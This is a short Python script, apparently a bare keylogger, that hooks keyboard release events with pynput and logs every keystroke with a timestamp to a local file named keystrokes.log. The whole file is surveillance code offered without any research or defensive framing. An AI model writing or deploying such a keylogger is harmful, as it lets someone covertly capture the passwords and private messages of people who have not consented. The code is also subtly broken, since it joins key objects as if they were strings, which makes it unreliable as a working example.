import logging
from pynput import keyboard

# Setup logging
logging.basicConfig(
    filename='keystrokes.log', 
    level=logging.INFO, 
    filemode='w',
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# List to store all keystrokes
keystrokes = []

def on_release(key):
    keystrokes.append(key)
    logging.info(f'Keys recorded: {", ".join(keystrokes)}')

def main():
    # Collect events until released
    with keyboard.Listener(on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
